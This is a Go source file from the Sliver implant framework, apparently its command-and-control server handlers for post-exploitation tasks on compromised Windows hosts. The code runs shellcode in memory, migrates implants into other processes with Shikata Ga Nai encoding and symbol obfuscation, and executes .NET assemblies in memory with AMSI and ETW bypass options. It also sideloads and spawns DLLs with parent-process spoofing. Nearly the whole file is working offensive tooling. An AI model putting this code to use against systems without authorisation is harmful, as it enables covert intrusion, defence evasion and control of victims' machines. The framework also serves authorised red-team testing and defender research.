package rpc

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"bytes"
	"context"
	"encoding/binary"
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"github.com/Binject/debug/pe"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/bishopfox/sliver/server/codenames"
	"github.com/bishopfox/sliver/server/core"
	"github.com/bishopfox/sliver/server/cryptography"
	"github.com/bishopfox/sliver/server/db"
	"github.com/bishopfox/sliver/server/db/models"
	"github.com/bishopfox/sliver/server/generate"
	"github.com/bishopfox/sliver/server/log"
	"github.com/bishopfox/sliver/server/sgn"

	"google.golang.org/grpc/codes"
	"google.golang.org/grpc/status"
	"google.golang.org/protobuf/proto"
)

var (
	tasksLog = log.NamedLogger("rpc", "tasks")
)

// Task - Execute shellcode in-memory
func (rpc *Server) Task(ctx context.Context, req *sliverpb.TaskReq) (*sliverpb.Task, error) {
	resp := &sliverpb.Task{Response: &commonpb.Response{}}
	err := rpc.GenericHandler(req, resp)
	if err != nil {
		return nil, err
	}
	return resp, nil
}

// Migrate - Migrate to a new process on the remote system (Windows only)
func (rpc *Server) Migrate(ctx context.Context, req *clientpb.MigrateReq) (*sliverpb.Migrate, error) {
	var shellcode []byte
	session := core.Sessions.Get(req.Request.SessionID)
	if session == nil {
		return nil, ErrInvalidSessionID
	}
	name := filepath.Base(req.Config.GetName())
	shellcode, arch, err := getSliverShellcode(name)
	if err != nil {
		name, config := generate.ImplantConfigFromProtobuf(req.Config)
		if name == "" {
			name, err = codenames.GetCodename()
			if err != nil {
				return nil, err
			}
		}
		config.Format = clientpb.OutputFormat_SHELLCODE
		config.ObfuscateSymbols = true
		otpSecret, _ := cryptography.TOTPServerSecret()
		err = generate.GenerateConfig(name, config, true)
		if err != nil {
			return nil, err
		}
		shellcodePath, err := generate.SliverShellcode(name, otpSecret, config, true)
		if err != nil {
			return nil, err
		}
		shellcode, _ = os.ReadFile(shellcodePath)
	}

	if len(shellcode) < 1 {
		return nil, status.Error(codes.OutOfRange, "shellcode is zero bytes")
	}

	switch req.Encoder {

	case clientpb.ShellcodeEncoder_SHIKATA_GA_NAI:
		shellcode, err = sgn.EncodeShellcode(shellcode, arch, 1, []byte{})
		if err != nil {
			return nil, err
		}

	}

	reqData, err := proto.Marshal(&sliverpb.InvokeMigrateReq{
		Request: req.Request,
		Data:    shellcode,
		Pid:     req.Pid,
	})
	if err != nil {
		return nil, err
	}
	timeout := rpc.getTimeout(req)
	respData, err := session.Request(sliverpb.MsgInvokeMigrateReq, timeout, reqData)
	if err != nil {
		return nil, err
	}
	resp := &sliverpb.Migrate{}
	err = proto.Unmarshal(respData, resp)
	if err != nil {
		return nil, err
	}
	return resp, nil
}

// ExecuteAssembly - Execute a .NET assembly on the remote system in-memory (Windows only)
func (rpc *Server) ExecuteAssembly(ctx context.Context, req *sliverpb.ExecuteAssemblyReq) (*sliverpb.ExecuteAssembly, error) {
	var session *core.Session
	var beacon *models.Beacon
	var err error
	if !req.Request.Async {
		session = core.Sessions.Get(req.Request.SessionID)
		if session == nil {
			return nil, ErrInvalidSessionID
		}
	} else {
		beacon, err = db.BeaconByID(req.Request.BeaconID)
		if err != nil {
			tasksLog.Errorf("%s", err)
			return nil, ErrDatabaseFailure
		}
		if beacon == nil {
			return nil, ErrInvalidBeaconID
		}
	}

	shellcode, err := generate.DonutFromAssembly(
		req.Assembly,
		req.IsDLL,
		req.Arch,
		req.Arguments,
		req.Method,
		req.ClassName,
		req.AppDomain,
	)
	if err != nil {
		tasksLog.Errorf("Execute assembly failed: %s", err)
		return nil, err
	}

	resp := &sliverpb.ExecuteAssembly{Response: &commonpb.Response{}}
	if req.InProcess {
		tasksLog.Infof("Executing assembly in-process")
		invokeInProcExecAssembly := &sliverpb.InvokeInProcExecuteAssemblyReq{
			Data:       req.Assembly,
			Runtime:    req.Runtime,
			Arguments:  strings.Split(req.Arguments, " "),
			AmsiBypass: req.AmsiBypass,
			EtwBypass:  req.EtwBypass,
			Request:    req.Request,
		}
		err = rpc.GenericHandler(invokeInProcExecAssembly, resp)
	} else {
		invokeExecAssembly := &sliverpb.InvokeExecuteAssemblyReq{
			Data:        shellcode,
			Process:     req.Process,
			Request:     req.Request,
			PPid:        req.PPid,
			ProcessArgs: req.ProcessArgs,
		}
		err = rpc.GenericHandler(invokeExecAssembly, resp)

	}
	if err != nil {
		return nil, err
	}
	return resp, nil
}

// Sideload - Sideload a DLL on the remote system (Windows only)
func (rpc *Server) Sideload(ctx context.Context, req *sliverpb.SideloadReq) (*sliverpb.Sideload, error) {
	var (
		session *core.Session
		beacon  *models.Beacon
		err     error
		arch    string
	)
	if !req.Request.Async {
		session = core.Sessions.Get(req.Request.SessionID)
		if session == nil {
			return nil, ErrInvalidSessionID
		}
		arch = session.Arch
	} else {
		beacon, err = db.BeaconByID(req.Request.BeaconID)
		if err != nil {
			msfLog.Errorf("%s", err)
			return nil, ErrDatabaseFailure
		}
		if beacon == nil {
			return nil, ErrInvalidBeaconID
		}
		arch = beacon.Arch
	}

	if getOS(session, beacon) == "windows" {
		shellcode, err := generate.DonutShellcodeFromPE(req.Data, arch, false, req.Args, "", req.EntryPoint, req.IsDLL, req.IsUnicode)
		if err != nil {
			tasksLog.Errorf("Sideload failed: %s", err)
			return nil, err
		}
		req = &sliverpb.SideloadReq{
			Request:     req.Request,
			Data:        shellcode,
			ProcessName: req.ProcessName,
			Kill:        req.Kill,
			PPid:        req.PPid,
			ProcessArgs: req.ProcessArgs,
		}
	}
	resp := &sliverpb.Sideload{Response: &commonpb.Response{}}
	err = rpc.GenericHandler(req, resp)
	if err != nil {
		return nil, err
	}
	return resp, nil
}

// SpawnDll - Spawn a DLL on the remote system (Windows only)
func (rpc *Server) SpawnDll(ctx context.Context, req *sliverpb.InvokeSpawnDllReq) (*sliverpb.SpawnDll, error) {
	var session *core.Session
	var beacon *models.Beacon
	var err error
	if !req.Request.Async {
		session = core.Sessions.Get(req.Request.SessionID)
		if session == nil {
			return nil, ErrInvalidSessionID
		}
	} else {
		beacon, err = db.BeaconByID(req.Request.BeaconID)
		if err != nil {
			msfLog.Errorf("%s", err)
			return nil, ErrDatabaseFailure
		}
		if beacon == nil {
			return nil, ErrInvalidBeaconID
		}
	}

	resp := &sliverpb.SpawnDll{Response: &commonpb.Response{}}
	offset, err := getExportOffsetFromMemory(req.Data, req.EntryPoint)
	if err != nil {
		return nil, err
	}
	spawnDLLReq := &sliverpb.SpawnDllReq{
		Data:        req.Data,
		Offset:      offset,
		ProcessName: req.ProcessName,
		Args:        req.Args,
		Request:     req.Request,
		Kill:        req.Kill,
		PPid:        req.PPid,
		ProcessArgs: req.ProcessArgs,
	}
	err = rpc.GenericHandler(spawnDLLReq, resp)
	if err != nil {
		return nil, err
	}
	return resp, nil
}

func getOS(session *core.Session, beacon *models.Beacon) string {
	if session != nil {
		return session.OS
	}
	if beacon != nil {
		return beacon.OS
	}
	return ""
}

// Utility functions
func getSliverShellcode(name string) ([]byte, string, error) {
	var data []byte
	build, err := db.ImplantBuildByName(name)
	if err != nil {
		return nil, "", err
	}

	switch build.ImplantConfig.Format {

	case clientpb.OutputFormat_SHELLCODE:
		fileData, err := generate.ImplantFileFromBuild(build)
		if err != nil {
			return []byte{}, "", err
		}
		data = fileData

	case clientpb.OutputFormat_EXECUTABLE:
		// retrieve EXE from db
		fileData, err := generate.ImplantFileFromBuild(build)
		rpcLog.Debugf("Found implant. Len: %d\n", len(fileData))
		if err != nil {
			return []byte{}, "", err
		}
		data, err = generate.DonutShellcodeFromPE(fileData, build.ImplantConfig.GOARCH, false, "", "", "", false, false)
		if err != nil {
			rpcLog.Errorf("DonutShellcodeFromPE error: %v\n", err)
			return []byte{}, "", err
		}

	case clientpb.OutputFormat_SHARED_LIB:
		// retrieve DLL from db
		fileData, err := generate.ImplantFileFromBuild(build)
		if err != nil {
			return []byte{}, "", err
		}
		data, err = generate.ShellcodeRDIFromBytes(fileData, "StartW", "")
		if err != nil {
			return []byte{}, "", err
		}

	case clientpb.OutputFormat_SERVICE:
		fallthrough
	default:
		err = fmt.Errorf("no existing shellcode found")
	}

	return data, build.ImplantConfig.GOARCH, err
}

// ExportDirectory - stores the Export data
type ExportDirectory struct {
	Characteristics       uint32
	TimeDateStamp         uint32
	MajorVersion          uint16
	MinorVersion          uint16
	Name                  uint32
	Base                  uint32
	NumberOfFunctions     uint32
	NumberOfNames         uint32
	AddressOfFunctions    uint32 // RVA from base of image
	AddressOfNames        uint32 // RVA from base of image
	AddressOfNameOrdinals uint32 // RVA from base of image
}

func rvaToFoa(rva uint32, pefile *pe.File) uint32 {
	var offset uint32
	for _, section := range pefile.Sections {
		if rva >= section.SectionHeader.VirtualAddress && rva <= section.SectionHeader.VirtualAddress+section.SectionHeader.Size {
			offset = section.SectionHeader.Offset + (rva - section.SectionHeader.VirtualAddress)
		}
	}
	return offset
}

func getFuncName(index uint32, rawData []byte, fpe *pe.File) string {
	nameRva := binary.LittleEndian.Uint32(rawData[index:])
	nameFOA := rvaToFoa(nameRva, fpe)
	funcNameBytes, err := bytes.NewBuffer(rawData[nameFOA:]).ReadBytes(0)
	if err != nil {
		tasksLog.Fatal(err)
		return ""
	}
	funcName := string(funcNameBytes[:len(funcNameBytes)-1])
	return funcName
}

func getOrdinal(index uint32, rawData []byte, fpe *pe.File, funcArrayFoa uint32) uint32 {
	ordRva := binary.LittleEndian.Uint16(rawData[index:])
	funcArrayIndex := funcArrayFoa + uint32(ordRva)*8
	funcRVA := binary.LittleEndian.Uint32(rawData[funcArrayIndex:])
	funcOffset := rvaToFoa(funcRVA, fpe)
	return funcOffset
}

// func getExportOffsetFromFile(filepath string, exportName string) (funcOffset uint32, err error) {
// 	rawData, err := ioutil.ReadFile(filepath)
// 	if err != nil {
// 		return 0, err
// 	}
// 	handle, err := os.Open(filepath)
// 	if err != nil {
// 		return 0, err
// 	}
// 	defer handle.Close()
// 	fpe, _ := pe.NewFile(handle)
// 	var exportDirectoryRVA uint32
// 	switch (fpe.OptionalHeader).(type) {
// 	case *pe.OptionalHeader32:
// 		exportDirectoryRVA = fpe.OptionalHeader.(*pe.OptionalHeader32).DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
// 	case *pe.OptionalHeader64:
// 		exportDirectoryRVA = fpe.OptionalHeader.(*pe.OptionalHeader64).DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
// 	}
// 	var offset = rvaToFoa(exportDirectoryRVA, fpe)
// 	exportDir := ExportDirectory{}
// 	buff := &bytes.Buffer{}
// 	buff.Write(rawData[offset:])
// 	err = binary.Read(buff, binary.LittleEndian, &exportDir)
// 	if err != nil {
// 		return 0, err
// 	}
// 	current := exportDir.AddressOfNames
// 	nameArrayFOA := rvaToFoa(exportDir.AddressOfNames, fpe)
// 	ordinalArrayFOA := rvaToFoa(exportDir.AddressOfNameOrdinals, fpe)
// 	funcArrayFoa := rvaToFoa(exportDir.AddressOfFunctions, fpe)

// 	for i := uint32(0); i < exportDir.NumberOfNames; i++ {
// 		index := nameArrayFOA + i*8
// 		name := getFuncName(index, rawData, fpe)
// 		if strings.Contains(name, exportName) {
// 			ordIndex := ordinalArrayFOA + i*2
// 			funcOffset = getOrdinal(ordIndex, rawData, fpe, funcArrayFoa)
// 		}
// 		current += uint32(binary.Size(i))
// 	}

// 	return
// }

func getExportOffsetFromMemory(rawData []byte, exportName string) (funcOffset uint32, err error) {
	peReader := bytes.NewReader(rawData)
	fpe, err := pe.NewFile(peReader)
	if err != nil {
		return 0, err
	}

	var exportDirectoryRVA uint32
	switch (fpe.OptionalHeader).(type) {
	case *pe.OptionalHeader32:
		exportDirectoryRVA = fpe.OptionalHeader.(*pe.OptionalHeader32).DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
	case *pe.OptionalHeader64:
		exportDirectoryRVA = fpe.OptionalHeader.(*pe.OptionalHeader64).DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
	}
	var offset = rvaToFoa(exportDirectoryRVA, fpe)
	exportDir := ExportDirectory{}
	buff := &bytes.Buffer{}
	buff.Write(rawData[offset:])
	err = binary.Read(buff, binary.LittleEndian, &exportDir)
	if err != nil {
		return 0, err
	}
	current := exportDir.AddressOfNames
	nameArrayFOA := rvaToFoa(exportDir.AddressOfNames, fpe)
	ordinalArrayFOA := rvaToFoa(exportDir.AddressOfNameOrdinals, fpe)
	funcArrayFoa := rvaToFoa(exportDir.AddressOfFunctions, fpe)

	for i := uint32(0); i < exportDir.NumberOfNames; i++ {
		index := nameArrayFOA + i*8
		name := getFuncName(index, rawData, fpe)
		if strings.Contains(name, exportName) {
			ordIndex := ordinalArrayFOA + i*2
			funcOffset = getOrdinal(ordIndex, rawData, fpe, funcArrayFoa)
		}
		current += uint32(binary.Size(i))
	}

	return
}
